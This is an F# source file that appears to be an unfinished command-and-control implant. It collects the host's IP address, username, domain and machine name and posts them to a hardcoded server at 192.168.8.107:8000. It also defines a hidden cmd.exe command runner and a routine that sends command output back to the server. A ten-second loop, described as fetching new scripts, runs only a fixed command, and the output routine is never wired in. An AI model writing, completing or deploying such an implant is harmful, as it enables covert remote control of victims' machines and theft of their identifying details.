open System
open System.Net
open System.Net.Http
open System.Diagnostics
open System.Threading
open System.IO

// Function to get machine details
let getMachineDetails () =
    try
        let ipAddress = 
            (Dns.GetHostEntry(Dns.GetHostName())).AddressList 
            |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) 
            |> Option.map (fun ip -> ip.ToString()) 
            |> Option.defaultValue "Unknown"
        let username = Environment.UserName
        let domainName = Environment.UserDomainName
        let hostName = Environment.MachineName
        sprintf "%s_%s_%s_%s" ipAddress username domainName hostName
    with
    | ex -> 
        printfn "Error fetching machine details: %s" ex.Message
        "Unknown_Client"

// Function to send output to the web server
let sendOutputToServer (url: string) (message: string) (sessionId: string) =
    try
        use client = new HttpClient()
        let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
        let response = client.PostAsync(sprintf "%s/receiveOutput?clientId=%s" url sessionId, content).Result
        if response.IsSuccessStatusCode then
            printfn "Output sent to server successfully"
        else
            printfn "Failed to send output to server: %s" (response.ReasonPhrase)
    with
    | ex -> 
        printfn "Error sending output to server: %s" ex.Message

// Function to run a command and return its output
let runCommand (command: string) =
    try
        let startInfo = ProcessStartInfo(
            FileName = "cmd.exe",  // Use cmd.exe for Windows
            Arguments = sprintf "/c %s" command,  // /c to execute the command and then terminate
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        )
        
        use proc = new Process()  // Renamed from process to proc
        proc.StartInfo <- startInfo
        proc.Start() |> ignore

        let output = proc.StandardOutput.ReadToEnd()
        let error = proc.StandardError.ReadToEnd()
        proc.WaitForExit()

        if proc.ExitCode = 0 then
            Some output
        else
            Some (sprintf "Error: %s" error)
    with
    | ex -> Some (sprintf "Exception: %s" ex.Message)

// Function to execute the script download and run logic
let executeScript (sessionId: string) =
    async {
        // Register the client with the web server
        try
            use client = new HttpClient()
            let content = new StringContent(getMachineDetails(), System.Text.Encoding.UTF8, "text/plain")
            let! response = client.PostAsync("http://192.168.8.107:8000/registerClient", content) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                printfn "Client registered successfully with session ID: %s" sessionId
            else
                printfn "Failed to register client: %s" (response.ReasonPhrase)
        with
        | ex -> 
            printfn "Error registering client: %s" ex.Message
    }

// Entry point for the program
[<EntryPoint>]
let main argv =
    // Get the machine details to use as client ID
    let sessionId = sprintf "Session%d" 1 // Set initial session ID
    executeScript sessionId |> Async.RunSynchronously
    
    // Loop to check for new scripts every 10 seconds
    while true do
        // Sleep for 10 seconds
        Thread.Sleep(10000)
        // Execute the command
        match runCommand "cd" with
        | Some result -> printfn "Command Output:\n%s" result
        | None -> printfn "Failed to run the command."

    0 // return an integer exit code
